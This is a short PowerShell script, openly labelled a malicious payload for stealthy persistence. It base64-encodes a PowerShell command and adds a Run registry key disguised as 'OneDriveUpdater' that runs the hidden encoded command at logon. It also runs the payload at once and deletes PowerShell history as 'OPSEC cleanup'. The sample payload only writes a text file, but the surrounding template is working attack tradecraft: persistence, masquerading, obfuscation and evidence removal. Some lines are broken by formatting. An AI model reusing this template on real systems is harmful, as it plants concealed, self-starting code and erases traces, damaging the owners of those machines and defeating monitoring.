# Malicious Payload Script - stealthy persistence
$payload = 'Set-Content -Path "$env:TEMP\sysinfo.txt" -Value "Hello again Old Friend"; Start-Process notepad "$env:TEMP\sysinfo.txt" -WindowStyle Hidden'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encodedPayload = [Convert]::ToBase64String($bytes)

# Persistence via Registry (Stealthy) New-ItemProperty -Path "HKCU:
\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "OneDriveUpdater" `
-Value "powershell.exe -nop -windowstyle hidden
-encodedcommand $encodedPayload" `
-PropertyType String -Force

# Execute payload immediately (stealthily)
Start-Process -WindowStyle Hidden powershell.exe "-nop -encodedcommand
$encodedPayload"

# Clear history (OPSEC cleanup) Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
